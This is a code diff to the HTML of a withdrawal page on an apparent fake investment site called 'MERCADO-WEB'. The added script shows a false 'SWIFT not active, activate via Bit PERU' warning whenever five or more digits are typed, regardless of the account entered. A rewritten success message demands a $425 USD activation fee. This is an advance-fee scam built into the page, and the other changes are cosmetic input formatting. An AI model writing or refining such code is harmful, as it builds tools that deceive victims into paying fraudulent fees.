@@ -5,6 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MERCADO-WEB | Plataforma Educativa</title>
     <style>
+
+        .swift-warning {
+    display: none;
+    margin-top: 6px;
+    padding: 8px 10px;
+    font-size: 13px;
+    border-radius: 6px;
+    background: #fff3cd;
+    color: #856404;
+    border: 1px solid #ffeeba;
+}
         :root {
             --primary: #1a1f36;
             --secondary: #2d3348;
@@ -547,7 +558,7 @@
                 </div>
             </div>
             <div class="login-error" id="loginError">❌ Error</div>
-            <button class="btn-login" id="btnLogin">🚀 INGRESAR</button>
+            <button class="btn-login" id="btnLogin"> INGRESAR</button>
         </div>
         <p class="login-hint">Usuario: <strong>el indicado por su asesor</strong> | Contraseña: <strong>12****</strong></p>
     </div>
@@ -570,7 +581,7 @@
             <li><a href="#retiro">Retiro</a></li>
         </ul>
         <div class="nav-right">
-            <div class="user-badge">👤 <span id="welcomeUser">Usuario</span></div>
+            <div class="user-badge"><span id="welcomeUser">Usuario</span></div>
             <div class="mobile-menu" onclick="toggleMobileMenu()">
                 <span></span><span></span><span></span>
             </div>
@@ -962,13 +973,17 @@
             </div>
 
             <div class="form-group">
-                <label>Número de Cuenta</label>
-                <input type="text" id="inputCuenta" placeholder="Ej: 0123456789" maxlength="20">
+                 <label>Número de Cuenta</label>
+    <input type="text" id="inputCuenta" placeholder="Ej: 0123456789" maxlength="20">
+
+    <div id="swiftWarning" class="swift-warning">
+        ⚠ Esta cuenta no tiene SWIFT activo, debe activarlo mediante Bit PERU
+    </div>
             </div>
 
             <div class="form-group">
                 <label>Monto a Retirar (USD)</label>
-                <input type="number" id="inputMonto" placeholder="0.00" min="1">
+                <input type="text" id="inputMonto" placeholder="0.00" inputmode="decimal" autocomplete="off">
             </div>
 
             <div class="amount-display">
@@ -983,7 +998,7 @@
                 <div class="check-icon">✅</div>
                 <h3>¡Retiro Procesado Exitosamente!</h3>
                 <p>Gracias por confiar en <strong>MERCADO-WEB</strong>.</p>
-                <p>Su proceso de retiro fue exitoso, ahora está en <strong>validación</strong>.</p>
+                <p>Su proceso de retiro fue exitoso, ahora está en <strong>validación recuede, para evitar contratiempos debe tener, su codigo SWIFT (o BIC) activo mediante BIT PERU por valor $ 425,00 USD </strong>.</p>
                 <div class="validation-steps">
                     <div class="step"><div class="step-dot"></div><span>Verificación</span></div>
                     <div class="step"><div class="step-dot delay1"></div><span>Procesando</span></div>
@@ -1153,6 +1168,21 @@ document.addEventListener('DOMContentLoaded', function() {
     if (inputMonto) {
         inputMonto.addEventListener('input', updateAmount);
     }
+    const inputCuenta = document.getElementById('inputCuenta');
+const swiftWarning = document.getElementById('swiftWarning');
+
+if (inputCuenta) {
+    inputCuenta.addEventListener('input', function () {
+
+        let soloNumeros = inputCuenta.value.replace(/\D/g, '');
+
+        if (soloNumeros.length >= 5) {
+            swiftWarning.style.display = 'block';
+        } else {
+            swiftWarning.style.display = 'none';
+        }
+    });
+}
     
     const btnWithdraw = document.getElementById('btnWithdraw');
     if (btnWithdraw) {
@@ -1308,8 +1338,44 @@ function updateBanks() {
 }
 
 function updateAmount(){
-    var v = parseFloat(document.getElementById('inputMonto').value)||0;
-    document.getElementById('displayAmount').textContent = '$'+v.toFixed(2)+' USD';
+     let inputField = document.getElementById('inputMonto');
+    let display = document.getElementById('displayAmount');
+
+    let value = inputField.value;
+
+    // Eliminar todo lo que no sea número o punto
+    value = value.replace(/[^0-9.]/g, '');
+
+    // Permitir solo un punto decimal
+    let parts = value.split('.');
+    if (parts.length > 2) {
+        value = parts[0] + '.' + parts[1];
+    }
+
+    // Separar parte entera y decimal
+    let integerPart = parts[0];
+    let decimalPart = parts[1] || '';
+
+    // Limitar a 2 decimales
+    decimalPart = decimalPart.substring(0, 2);
+
+    // Agregar comas a miles
+    let formattedInteger = integerPart.replace(/\B(?=(\d{3})+(?!\d))/g, ",");
+
+    let formattedValue = decimalPart.length > 0
+        ? formattedInteger + '.' + decimalPart
+        : formattedInteger;
+
+    inputField.value = formattedValue;
+
+    let numericValue = parseFloat(integerPart + '.' + decimalPart);
+    if (isNaN(numericValue)) numericValue = 0;
+
+    display.textContent =
+        '$' + numericValue.toLocaleString('en-US', {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        }) + ' USD';
 }
 
 // TERMS
@@ -1369,3 +1435,6 @@ function processWithdrawal() {
 
 </body>
 </html>
+
+
+
